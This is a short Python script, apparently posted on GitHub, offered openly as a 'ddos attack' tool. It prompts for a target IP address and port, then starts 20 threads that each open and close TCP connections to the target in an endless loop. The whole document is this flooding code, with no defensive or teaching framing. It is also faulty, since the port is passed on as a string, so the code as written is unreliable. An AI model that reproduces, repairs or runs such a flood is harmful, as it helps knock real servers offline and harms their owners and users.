#github -----> https://github.com/amir-kali-linux/
import time
import socket,threading,time
time.sleep(1)
print("https://github.com/amir-kali-linux/")

print('----------|>ddos attack ip<|----------')
time.sleep(2)
ip = input('Enter ip:')
port = input('Enter port:')

print('attack')

def at():
    i = 'ddos attack ip address'
    while True:
        sok= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sok.connect((ip,port))
        sok.close()
        print(i)
time.sleep(2)

for i in range(20):
    tr=threading.Thread(target=at)
    tr.start()